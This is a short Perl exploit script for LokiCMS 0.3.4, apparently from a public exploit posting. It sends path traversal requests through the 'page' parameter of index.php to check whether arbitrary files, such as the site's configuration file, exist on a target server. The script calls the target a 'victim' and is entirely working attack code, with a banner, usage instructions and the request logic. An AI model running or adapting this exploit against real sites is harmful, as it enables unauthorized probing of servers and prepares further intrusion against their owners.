print "#################################################################\n";
print "#  LokiCMS 0.3.4 (index.php page) Arbitrary Check File Exploit  #\n";
print "#################################################################\n";

my $victim = $ARGV[0];
my $file = $ARGV[1];

 if((!$ARGV[0]) && (!$ARGV[1])) {
    print "\n[x] LokiCMS 0.3.4 (index.php page) Arbitrary Check File Exploit\n";
    print "[x] written by JosS - sys-project[at]hotmail.com\n";
    print "[x] usage: perl xpl.pl [host] [file]\n";
    print "[x] example: http://localhost/loki/ /includes/Config.php\n\n";
    exit(1);
 }
 
    print "\n[+] connecting: $victim\n";
    my $cnx = LWP::UserAgent->new() or die;
    my $go=$cnx->get($victim."index.php?page=../$file");
    if ($go->content =~ m/LokiCMS/ms) {
        print "[-] The file not exist\n\n";
    } else {
        print "[!] The file exist: $file\n\n";
    }